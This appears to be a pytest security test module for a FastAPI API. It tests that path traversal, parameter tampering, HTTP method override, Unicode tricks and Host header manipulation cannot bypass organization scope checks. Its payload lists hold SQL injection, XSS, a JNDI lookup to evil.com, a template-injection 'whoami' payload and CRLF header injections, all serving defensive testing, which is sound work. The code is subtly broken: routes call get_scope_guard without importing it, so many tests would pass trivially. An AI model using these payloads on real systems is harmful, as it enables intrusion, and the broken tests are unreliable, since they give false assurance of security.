# Author: Eldrie (CTO Dev)
# Date: 2025-10-20
# Role: Integration Testing

"""
URL manipulation security tests.

This module tests that URL manipulation attacks cannot bypass
scope enforcement or access controls.

Test Scenarios:
1. Path traversal attacks
2. Parameter tampering attacks
3. URL encoding bypass attempts
4. HTTP method tampering
5. Host header manipulation
6. Query parameter injection
"""

import pytest
from unittest.mock import AsyncMock, patch, MagicMock
from fastapi import FastAPI, HTTPException, status
from fastapi.testclient import TestClient
from urllib.parse import quote, unquote

from backend.app.core.scope import ScopeGuard, ScopeContext, ScopeDecision
from backend.app.core.errors import APIError


@pytest.mark.security
class TestPathTraversalSecurity:
    """Test path traversal attack prevention."""

    @pytest.fixture
    def app_with_test_routes(self, mock_scope_guard):
        """Create FastAPI app with test routes vulnerable to path traversal."""
        app = FastAPI()

        # Override the global scope guard
        from backend.app.core.scope import set_scope_guard
        set_scope_guard(mock_scope_guard)

        @app.get("/api/organizations/{org_id}/projects")
        async def get_projects(org_id: str):
            # Simulate scope validation
            guard = get_scope_guard()
            principal = MagicMock()
            principal.id = "test_user"
            principal.org_ids = {"org_123"}

            try:
                await guard.check_organization_access(principal, org_id, {"project:read"})
                return {"org_id": org_id, "projects": []}
            except APIError:
                raise HTTPException(status_code=403, detail="Access denied")

        @app.get("/api/organizations/{org_id}/divisions/{div_id}/projects")
        async def get_division_projects(org_id: str, div_id: str):
            # Simulate scope validation
            guard = get_scope_guard()
            principal = MagicMock()
            principal.id = "test_user"
            principal.org_ids = {"org_123"}
            principal.division_ids = {"org_123": ["div_1"]}

            try:
                await guard.check_division_access(principal, org_id, div_id, {"project:read"})
                return {"org_id": org_id, "div_id": div_id, "projects": []}
            except APIError:
                raise HTTPException(status_code=403, detail="Access denied")

        return app

    @pytest.fixture
    def test_client(self, app_with_test_routes):
        """Create test client."""
        return TestClient(app_with_test_routes)

    def test_path_traversal_with_dot_dot_slash(
        self, test_client, mock_scope_guard
    ):
        """Test path traversal using ../ sequences."""
        traversal_attempts = [
            "../../../org_123/projects",
            "..\\..\\..\\org_123\\projects",
            "org_123/../../../projects",
            "org_123\\..\\..\\..\\projects",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2forg_123%2fprojects",  # URL encoded
            "%2e%2e%5c%2e%2e%5c%2e%2e%5corg_123%5cprojects",  # URL encoded Windows
        ]

        # Mock scope guard to only allow org_123
        async def mock_check_org_access(principal, org_id, required_permissions=None):
            if org_id == "org_123":
                return ScopeContext(
                    principal=principal,
                    organization_id=org_id,
                    division_id=None,
                    permissions={"project:read"},
                    decision=ScopeDecision.ALLOW
                )
            else:
                raise APIError(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail="Organization access denied",
                    code="org_access_denied"
                )

        mock_scope_guard.check_organization_access = mock_check_org_access

        for traversal_path in traversal_attempts:
            response = test_client.get(f"/api/organizations/{traversal_path}")
            # Should never succeed with path traversal
            assert response.status_code != 200

    def test_path_traversal_with_encoded_sequences(
        self, test_client, mock_scope_guard
    ):
        """Test path traversal using encoded sequences."""
        encoded_attempts = [
            "%2e%2e%2f",  # ../
            "%2e%2e%5c",  # ..\
            "%2e%2e%2f%2e%2e%2f",  # ../../
            "..%2f",  # ../ (partial encoding)
            "..%5c",  # ..\ (partial encoding)
            "%252e%252e%252f",  # Double encoded
        ]

        for encoded_seq in encoded_attempts:
            malicious_path = f"org_123{encoded_seq}projects"
            response = test_client.get(f"/api/organizations/{malicious_path}")
            # Should never succeed with path traversal
            assert response.status_code != 200

    def test_path_traversal_with_null_bytes(
        self, test_client, mock_scope_guard
    ):
        """Test path traversal using null bytes."""
        null_byte_attempts = [
            "org_123%00/projects",
            "org_123\00/projects",
            "%00org_123/projects",
            "org_123/projects%00",
            "org_123\0/projects",
        ]

        for null_path in null_byte_attempts:
            response = test_client.get(f"/api/organizations/{null_path}")
            # Should never succeed with null byte injection
            assert response.status_code != 200

    def test_path_traversal_with_alternate_encodings(
        self, test_client, mock_scope_guard
    ):
        """Test path traversal with alternate encodings."""
        alternate_attempts = [
            "org_123%c0%afprojects",  # UTF-8 overlong encoding
            "org_123%c1%9cprojects",  # UTF-8 overlong encoding
            "org_123%e0%80%afprojects",  # UTF-8 overlong encoding
            "org_123%f0%80%80%afprojects",  # UTF-8 overlong encoding
        ]

        for alt_path in alternate_attempts:
            response = test_client.get(f"/api/organizations/{alt_path}")
            # Should never succeed with alternate encodings
            assert response.status_code != 200


@pytest.mark.security
class TestParameterTamperingSecurity:
    """Test parameter tampering attack prevention."""

    @pytest.fixture
    def app_with_param_routes(self, mock_scope_guard):
        """Create FastAPI app with parameter-based routes."""
        app = FastAPI()

        # Override the global scope guard
        from backend.app.core.scope import set_scope_guard
        set_scope_guard(mock_scope_guard)

        @app.get("/api/organizations/{org_id}/projects")
        async def get_projects(org_id: str, user_id: str = None):
            # Simulate scope validation
            guard = get_scope_guard()
            principal = MagicMock()
            principal.id = "test_user"
            principal.org_ids = {"org_123"}

            try:
                await guard.check_organization_access(principal, org_id, {"project:read"})
                return {"org_id": org_id, "projects": [], "requested_user": user_id}
            except APIError:
                raise HTTPException(status_code=403, detail="Access denied")

        @app.get("/api/organizations/{org_id}/divisions/{div_id}/projects")
        async def get_division_projects(org_id: str, div_id: str):
            # Simulate scope validation
            guard = get_scope_guard()
            principal = MagicMock()
            principal.id = "test_user"
            principal.org_ids = {"org_123"}
            principal.division_ids = {"org_123": ["div_1"]}

            try:
                await guard.check_division_access(principal, org_id, div_id, {"project:read"})
                return {"org_id": org_id, "div_id": div_id, "projects": []}
            except APIError:
                raise HTTPException(status_code=403, detail="Access denied")

        return app

    @pytest.fixture
    def test_client(self, app_with_param_routes):
        """Create test client."""
        return TestClient(app_with_param_routes)

    def test_organization_id_parameter_tampering(
        self, test_client, mock_scope_guard
    ):
        """Test organization ID parameter tampering."""
        # Mock scope guard to only allow org_123
        async def mock_check_org_access(principal, org_id, required_permissions=None):
            if org_id == "org_123":
                return ScopeContext(
                    principal=principal,
                    organization_id=org_id,
                    division_id=None,
                    permissions={"project:read"},
                    decision=ScopeDecision.ALLOW
                )
            else:
                raise APIError(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail="Organization access denied",
                    code="org_access_denied"
                )

        mock_scope_guard.check_organization_access = mock_check_org_access

        tampered_org_ids = [
            "org_456",  # Different organization
            "org_789",  # Another different organization
            "admin",    # Non-org ID
            "root",     # Privileged name
            "system",   # System name
        ]

        for tampered_org_id in tampered_org_ids:
            response = test_client.get(f"/api/organizations/{tampered_org_id}/projects")
            assert response.status_code == 403

    def test_division_id_parameter_tampering(
        self, test_client, mock_scope_guard
    ):
        """Test division ID parameter tampering."""
        # Mock scope guard to only allow org_123/div_1
        async def mock_check_div_access(principal, org_id, div_id, required_permissions=None):
            if org_id == "org_123" and div_id == "div_1":
                return ScopeContext(
                    principal=principal,
                    organization_id=org_id,
                    division_id=div_id,
                    permissions={"project:read"},
                    decision=ScopeDecision.ALLOW
                )
            else:
                raise APIError(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail="Division access denied",
                    code="division_access_denied"
                )

        mock_scope_guard.check_division_access = mock_check_div_access

        tampered_scenarios = [
            ("org_123", "div_2"),    # Wrong division
            ("org_456", "div_1"),    # Wrong org
            ("org_456", "div_2"),    # Wrong both
            ("org_123", "admin"),    # Admin division
            ("org_123", "root"),     # Root division
        ]

        for org_id, div_id in tampered_scenarios:
            response = test_client.get(f"/api/organizations/{org_id}/divisions/{div_id}/projects")
            assert response.status_code == 403

    def test_query_parameter_injection(
        self, test_client, mock_scope_guard
    ):
        """Test query parameter injection attacks."""
        # Mock successful scope validation
        async def mock_check_org_access(principal, org_id, required_permissions=None):
            if org_id == "org_123":
                return ScopeContext(
                    principal=principal,
                    organization_id=org_id,
                    division_id=None,
                    permissions={"project:read"},
                    decision=ScopeDecision.ALLOW
                )
            else:
                raise APIError(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail="Organization access denied",
                    code="org_access_denied"
                )

        mock_scope_guard.check_organization_access = mock_check_org_access

        injection_attempts = [
            "?user_id=admin' OR '1'='1",
            "?user_id=admin'; DROP TABLE projects; --",
            "?user_id=<script>alert('xss')</script>",
            "?user_id=${jndi:ldap://evil.com/a}",
            "?user_id={{7*7}}",
            "?user_id={{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
        ]

        for injection in injection_attempts:
            response = test_client.get(f"/api/organizations/org_123/projects{injection}")
            # Request should succeed (scope validation passes) but injection should be handled safely
            # The exact behavior depends on the implementation, but it shouldn't cause security issues
            assert response.status_code in [200, 400, 422]

    def test_parameter_pollution(
        self, test_client, mock_scope_guard
    ):
        """Test parameter pollution attacks."""
        # Mock successful scope validation
        async def mock_check_org_access(principal, org_id, required_permissions=None):
            return ScopeContext(
                principal=principal,
                organization_id=org_id,
                division_id=None,
                permissions={"project:read"},
                decision=ScopeDecision.ALLOW
            )

        mock_scope_guard.check_organization_access = mock_check_org_access

        pollution_attempts = [
            "?user_id=alice&user_id=admin",  # Multiple user_id parameters
            "?user_id=alice&user_id=admin&user_id=bob",  # Multiple parameters
        ]

        for pollution in pollution_attempts:
            response = test_client.get(f"/api/organizations/org_123/projects{pollution}")
            # Should handle parameter pollution safely
            # FastAPI typically uses the last value, which should be safe
            assert response.status_code == 200


@pytest.mark.security
class TestHTTPMethodTamperingSecurity:
    """Test HTTP method tampering prevention."""

    @pytest.fixture
    def app_with_method_routes(self, mock_scope_guard):
        """Create FastAPI app with different HTTP method handlers."""
        app = FastAPI()

        # Override the global scope guard
        from backend.app.core.scope import set_scope_guard
        set_scope_guard(mock_scope_guard)

        @app.get("/api/organizations/{org_id}/projects/{project_id}")
        async def get_project(org_id: str, project_id: str):
            # GET requires read permission
            guard = get_scope_guard()
            principal = MagicMock()
            principal.id = "test_user"
            principal.org_ids = {"org_123"}

            try:
                await guard.check_organization_access(principal, org_id, {"project:read"})
                return {"org_id": org_id, "project_id": project_id, "method": "GET"}
            except APIError:
                raise HTTPException(status_code=403, detail="Access denied")

        @app.delete("/api/organizations/{org_id}/projects/{project_id}")
        async def delete_project(org_id: str, project_id: str):
            # DELETE requires delete permission
            guard = get_scope_guard()
            principal = MagicMock()
            principal.id = "test_user"
            principal.org_ids = {"org_123"}

            try:
                await guard.check_organization_access(principal, org_id, {"project:delete"})
                return {"org_id": org_id, "project_id": project_id, "method": "DELETE"}
            except APIError:
                raise HTTPException(status_code=403, detail="Access denied")

        return app

    @pytest.fixture
    def test_client(self, app_with_method_routes):
        """Create test client."""
        return TestClient(app_with_method_routes)

    def test_method_tampering_with_x_http_method_override(
        self, test_client, mock_scope_guard
    ):
        """Test method tampering using X-HTTP-Method-Override header."""
        # Mock scope guard to allow read but not delete
        async def mock_check_org_access(principal, org_id, required_permissions=None):
            if "project:delete" in (required_permissions or set()):
                raise APIError(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail="Delete permission denied",
                    code="insufficient_permissions"
                )
            else:
                return ScopeContext(
                    principal=principal,
                    organization_id=org_id,
                    division_id=None,
                    permissions={"project:read"},
                    decision=ScopeDecision.ALLOW
                )

        mock_scope_guard.check_organization_access = mock_check_org_access

        # Try to override GET to DELETE
        response = test_client.get(
            "/api/organizations/org_123/projects/proj_123",
            headers={"X-HTTP-Method-Override": "DELETE"}
        )

        # FastAPI should ignore the override and treat it as GET
        assert response.status_code == 200
        data = response.json()
        assert data["method"] == "GET"

    def test_method_tampering_with_request_method_parameter(
        self, test_client, mock_scope_guard
    ):
        """Test method tampering using _method parameter."""
        # Mock scope guard to allow read but not delete
        async def mock_check_org_access(principal, org_id, required_permissions=None):
            if "project:delete" in (required_permissions or set()):
                raise APIError(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail="Delete permission denied",
                    code="insufficient_permissions"
                )
            else:
                return ScopeContext(
                    principal=principal,
                    organization_id=org_id,
                    division_id=None,
                    permissions={"project:read"},
                    decision=ScopeDecision.ALLOW
                )

        mock_scope_guard.check_organization_access = mock_check_org_access

        # Try to use _method parameter to override
        response = test_client.post(
            "/api/organizations/org_123/projects/proj_123?_method=DELETE"
        )

        # FastAPI should not support _method parameter override
        # Should return 405 Method Not Allowed
        assert response.status_code == 405

    def test_unsupported_http_methods(
        self, test_client, mock_scope_guard
    ):
        """Test unsupported HTTP methods."""
        unsupported_methods = [
            "PATCH",
            "HEAD",
            "OPTIONS",
            "TRACE",
            "CONNECT",
            "PROPFIND",
            "PROPPATCH",
            "MKCOL",
            "COPY",
            "MOVE",
            "LOCK",
            "UNLOCK",
        ]

        for method in unsupported_methods:
            response = test_client.request(
                method,
                "/api/organizations/org_123/projects/proj_123"
            )
            # Should reject unsupported methods
            assert response.status_code in [405, 404, 403]


@pytest.mark.security
class TestURLManipulationAdvanced:
    """Test advanced URL manipulation techniques."""

    @pytest.fixture
    def app_with_advanced_routes(self, mock_scope_guard):
        """Create FastAPI app for advanced URL manipulation tests."""
        app = FastAPI()

        # Override the global scope guard
        from backend.app.core.scope import set_scope_guard
        set_scope_guard(mock_scope_guard)

        @app.get("/api/organizations/{org_id}/projects")
        async def get_projects(org_id: str):
            guard = get_scope_guard()
            principal = MagicMock()
            principal.id = "test_user"
            principal.org_ids = {"org_123"}

            try:
                await guard.check_organization_access(principal, org_id, {"project:read"})
                return {"org_id": org_id, "projects": []}
            except APIError:
                raise HTTPException(status_code=403, detail="Access denied")

        return app

    @pytest.fixture
    def test_client(self, app_with_advanced_routes):
        """Create test client."""
        return TestClient(app_with_advanced_routes)

    def test_unicode_encoding_attacks(
        self, test_client, mock_scope_guard
    ):
        """Test Unicode-based encoding attacks."""
        unicode_attacks = [
            "org_123\ufeff/projects",  # Zero-width no-break space
            "org_123\u200b/projects",  # Zero-width space
            "org_123\u200c/projects",  # Zero-width non-joiner
            "org_123\u200d/projects",  # Zero-width joiner
            "org_123\ufeff/projects",  # BOM
        ]

        # Mock scope guard to only allow org_123
        async def mock_check_org_access(principal, org_id, required_permissions=None):
            # Normalize the org_id to remove invisible characters
            normalized_org_id = ''.join(
                char for char in org_id if not ord(char) in [0x200b, 0x200c, 0x200d, 0xfeff]
            )

            if normalized_org_id == "org_123":
                return ScopeContext(
                    principal=principal,
                    organization_id=normalized_org_id,
                    division_id=None,
                    permissions={"project:read"},
                    decision=ScopeDecision.ALLOW
                )
            else:
                raise APIError(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail="Organization access denied",
                    code="org_access_denied"
                )

        mock_scope_guard.check_organization_access = mock_check_org_access

        for unicode_path in unicode_attacks:
            response = test_client.get(f"/api/organizations/{unicode_path}")
            # Should handle Unicode attacks safely
            # May succeed if normalization works, or fail if not
            assert response.status_code in [200, 403, 404, 400]

    def test_double_url_encoding(
        self, test_client, mock_scope_guard
    ):
        """Test double URL encoding attacks."""
        # First encode org_456, then encode the result
        first_encode = quote("org_456", safe='')
        double_encode = quote(first_encode, safe='')

        # Mock scope guard to only allow org_123
        async def mock_check_org_access(principal, org_id, required_permissions=None):
            if org_id == "org_123":
                return ScopeContext(
                    principal=principal,
                    organization_id=org_id,
                    division_id=None,
                    permissions={"project:read"},
                    decision=ScopeDecision.ALLOW
                )
            else:
                raise APIError(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail="Organization access denied",
                    code="org_access_denied"
                )

        mock_scope_guard.check_organization_access = mock_check_org_access

        response = test_client.get(f"/api/organizations/{double_encode}/projects")
        # Should not succeed with double encoding
        assert response.status_code != 200

    def test_case_variation_attacks(
        self, test_client, mock_scope_guard
    ):
        """Test case variation attacks."""
        case_variations = [
            "ORG_123/projects",     # Uppercase
            "Org_123/projects",     # Mixed case
            "org_123/PROJECTS",    # Different path case
            "Org_123/Projects",     # All mixed case
        ]

        # Mock scope guard to only allow org_123 (case-sensitive)
        async def mock_check_org_access(principal, org_id, required_permissions=None):
            if org_id == "org_123":
                return ScopeContext(
                    principal=principal,
                    organization_id=org_id,
                    division_id=None,
                    permissions={"project:read"},
                    decision=ScopeDecision.ALLOW
                )
            else:
                raise APIError(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail="Organization access denied",
                    code="org_access_denied"
                )

        mock_scope_guard.check_organization_access = mock_check_org_access

        for case_path in case_variations:
            response = test_client.get(f"/api/organizations/{case_path}")
            # Case sensitivity depends on the implementation
            # but should be consistent
            assert response.status_code in [200, 403, 404]

    def test_url_fragment_manipulation(
        self, test_client, mock_scope_guard
    ):
        """Test URL fragment manipulation."""
        fragment_attempts = [
            "org_123/projects#admin",
            "org_123/projects#secret",
            "org_123/projects/../admin",
            "org_123/projects?user=admin",
        ]

        # Mock successful scope validation
        async def mock_check_org_access(principal, org_id, required_permissions=None):
            if org_id == "org_123":
                return ScopeContext(
                    principal=principal,
                    organization_id=org_id,
                    division_id=None,
                    permissions={"project:read"},
                    decision=ScopeDecision.ALLOW
                )
            else:
                raise APIError(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail="Organization access denied",
                    code="org_access_denied"
                )

        mock_scope_guard.check_organization_access = mock_check_org_access

        for fragment_path in fragment_attempts:
            # URL fragments are not sent to the server, so these should be handled safely
            if "?" in fragment_path:
                # Query parameters are sent to server
                response = test_client.get(f"/api/organizations/{fragment_path}")
                assert response.status_code in [200, 400, 422]
            else:
                # Fragments are client-side only
                response = test_client.get(f"/api/organizations/{fragment_path}")
                assert response.status_code == 200


@pytest.mark.security
class TestHostHeaderManipulation:
    """Test host header manipulation prevention."""

    @pytest.fixture
    def app_with_host_routes(self, mock_scope_guard):
        """Create FastAPI app for host header tests."""
        app = FastAPI()

        # Override the global scope guard
        from backend.app.core.scope import set_scope_guard
        set_scope_guard(mock_scope_guard)

        @app.get("/api/organizations/{org_id}/projects")
        async def get_projects(org_id: str, request):
            # Check host header for security
            host = request.headers.get("host", "")

            guard = get_scope_guard()
            principal = MagicMock()
            principal.id = "test_user"
            principal.org_ids = {"org_123"}

            try:
                await guard.check_organization_access(principal, org_id, {"project:read"})
                return {"org_id": org_id, "host": host, "projects": []}
            except APIError:
                raise HTTPException(status_code=403, detail="Access denied")

        return app

    @pytest.fixture
    def test_client(self, app_with_host_routes):
        """Create test client."""
        return TestClient(app_with_host_routes)

    def test_malicious_host_headers(
        self, test_client, mock_scope_guard
    ):
        """Test malicious host header values."""
        malicious_hosts = [
            "evil.com",
            "localhost:3000",
            "127.0.0.1",
            "0.0.0.0",
            "admin.yourever.com",
            "api.evil.com",
            "yourever.com.evil.com",
            "yourever.com/admin",
        ]

        # Mock successful scope validation
        async def mock_check_org_access(principal, org_id, required_permissions=None):
            return ScopeContext(
                principal=principal,
                organization_id=org_id,
                division_id=None,
                permissions={"project:read"},
                decision=ScopeDecision.ALLOW
            )

        mock_scope_guard.check_organization_access = mock_check_org_access

        for malicious_host in malicious_hosts:
            response = test_client.get(
                "/api/organizations/org_123/projects",
                headers={"Host": malicious_host}
            )
            # Should handle malicious host headers safely
            # The response should not leak sensitive information
            assert response.status_code == 200
            data = response.json()
            # Host header should be reflected but not cause security issues
            assert "host" in data

    def test_host_header_injection(
        self, test_client, mock_scope_guard
    ):
        """Test host header injection attempts."""
        injection_hosts = [
            "yourever.com\r\nX-Forwarded-For: 127.0.0.1",
            "yourever.com\r\nCookie: admin=true",
            "yourever.com\r\nAuthorization: Bearer fake_token",
            "yourever.com%0d%0aX-Forwarded-For: 127.0.0.1",  # URL encoded
        ]

        # Mock successful scope validation
        async def mock_check_org_access(principal, org_id, required_permissions=None):
            return ScopeContext(
                principal=principal,
                organization_id=org_id,
                division_id=None,
                permissions={"project:read"},
                decision=ScopeDecision.ALLOW
            )

        mock_scope_guard.check_organization_access = mock_check_org_access

        for injection_host in injection_hosts:
            response = test_client.get(
                "/api/organizations/org_123/projects",
                headers={"Host": injection_host}
            )
            # Should handle header injection safely
            # The exact behavior depends on the server configuration
            assert response.status_code in [200, 400, 422]


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])